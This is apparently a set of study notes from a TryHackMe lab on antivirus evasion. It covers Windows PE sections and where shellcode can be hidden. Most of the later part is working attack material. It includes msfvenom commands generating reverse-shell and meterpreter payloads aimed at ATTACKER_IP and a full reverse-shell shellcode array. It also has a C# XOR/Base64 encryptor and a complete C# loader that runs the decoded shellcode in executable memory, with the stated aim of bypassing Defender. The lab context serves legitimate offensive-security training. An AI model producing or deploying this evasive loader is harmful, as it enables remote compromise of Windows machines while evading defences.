## PE Structure

There are different types of data containers in the PE structure, each holding different data.

1.  **.text** stores the actual code of the program
2.  **.data** holds the initialized and defined variables
3.  **.bss** holds the uninitialized data (declared variables with no assigned values)
4.  **.rdata** contains the read-only data
5.  **.edata**: contains exportable objects and related table information
6.  **.idata** imported objects and related table information
7.  **.reloc** image relocation information
8.  **.rsrc** links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright!

The PE structure is a vast and complicated topic, and we are not going to go into too much detail regarding the headers and data sections. This task provides a high-level overview of the PE structure. If you are interested in gaining more information on the topic, we suggest checking the following THM rooms where the topic is explained in greater detail:

-   [Windows Internals](https://tryhackme.com/room/windowsinternals)
-   Dissecting PE Headers

You can also get more in-depth details about PE if you check the [Windows PE format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)'s Docs website.   

When looking at the PE contents, we'll see it contains a bunch of bytes that aren't human-readable. However, it includes all the details the loader needs to run the file. The following are the example steps in which the Windows loader reads an executable binary and runs it as a process.

1.  Header sections: DOS, Windows, and optional headers are parsed to provide information about the EXE file. For example,

-   The magic number starts with "MZ," which tells the loader that this is an EXE file.
-   File Signatures
-   Whether the file is compiled for x86 or x64 CPU architecture.
-   Creation timestamp. 

3.  Parsing the section table details, such as 

-   Number of Sections the file contains.

5.  Mapping the file contents into memory based on

-   The EntryPoint address and the offset of the ImageBase.   
    
-   RVA: Relative Virtual Address, Addresses related to Imagebase.  
    

7.  Imports, DLLs, and other objects are loaded into the memory.
8.  The EntryPoint address is located and the main execution function runs.

Why do we need to know about PE?  

There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure. 

The other reason is that AV software and malware analysts analyze EXE files based on the information in the PE Header and other PE sections. Thus, to create or modify malware with AV evasion capability targeting a Windows machine, we need to understand the structure of Windows Portable Executable files and where the malicious shellcode can be stored.

We can control in which Data section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE:

1.  Defining the shellcode as a local variable within the main function will store it in the **.TEXT** PE section.  
    
2.  Defining the shellcode as a global variable will store it in the **.Data** section.
3.  Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the **.rsrc** Data section. 
4.  We can add a custom data section to store the shellcode.


## Shellcode Encoding and Encryption 
### Encode using MSFVenom

**Listing Encoders within the Metasploit Framework**

```shell
msfvenom --list encoders | grep excellent
```


**Encoding using the Metasploit Framework (Shikata_ga_nai)**


```shell

msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

### Encryption using MSFVenom

```shell-session
msfvenom --list encrypt
```


**Xoring Shellcode using the Metasploit Framework**
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

### Creating a Custom Payload

The best way to overcome this is to use our own custom encoding schemes so that the AV doesn't know what to do to analyze our payload. Notice you don't have to do anything too complex, as long as it is confusing enough for the AV to analyze. For this task, we will take a simple reverse shell generated by msfvenom and use a combination of XOR and Base64 to bypass Defender.

Let's start by generating a reverse shell with msfvenom in CSharp format:

Generate a CSharp shellcode Format

```shell
user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

```
byte[] buf = new byte[460] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0x0a,0x09,0x09,0x43,0x41,0x54,
0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };

```

C:\Tools\CS Files\Encryptor.cs:
```csharp


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "THMK3y123!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}
```

**Compiling and running our custom CSharp encoder**
```shell-session
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
```

base64:ADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEzwOXA4cXJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==
```

qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEzwOXA4cXJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==

```

C:\Tools\CS Files\EncStageless.cs:

```csharp

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

**Compile Our Encrypted Payload**
```shell-session
C:\> csc.exe EncStageless.cs
```

**Set Up nc Listener**
```shell-session
nc -lvp 443
```


```

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEzwOXA4cXJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==";

    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);


    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```